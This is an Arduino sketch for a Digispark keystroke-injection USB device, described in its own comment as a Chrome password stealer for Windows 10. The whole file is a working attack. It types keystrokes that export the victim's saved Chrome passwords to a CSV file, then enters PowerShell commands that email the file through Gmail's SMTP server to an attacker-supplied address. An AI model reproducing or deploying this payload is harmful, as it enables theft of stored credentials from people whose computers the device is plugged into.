#include "DigiKeyboard.h"

void setup() {}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  // Ducky chrome password stealer for Windows 10
  // ----------- opens chrome web browser
  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT,KEY_R);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("chrome");
  DigiKeyboard.delay(400);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  // ----------- exports passwords into csv file
  DigiKeyboard.print("chrome://settings/passwords");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(700);
  DigiKeyboard.print("chromepasswords.csv");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,KEY_W);
  DigiKeyboard.delay(100);
  // -------------- sends it by email using powershell
  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT,KEY_R);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$SMTPServer = 'smtp.gmail.com'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("$SMTPInfo.EnableSSL = $true");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  // ---Make sure to enable less secure app access to sender's mail here: https://myaccount.google.com/lesssecureapps
  DigiKeyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR SENDER EMAIL HERE@gmail.com', 'SENDER'S EMAIL PASSWORD')");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("$SMTPServer = $E = New-Object System.Net.Mail.MailMessage");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("$E.From = 'YOUR SENDER EMAIL HERE@gmail.com'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("$E.To.Add('RECIEVER'S MAIL@gmail.com')");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("$E.Subject = $env:UserName");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("$E.Body = 'Success! The password file is attached!'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("$F = 'Documents/chromepasswords.csv'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("$E.Attachments.Add($F)");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("$F = $SMTPInfo.Send($E)");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
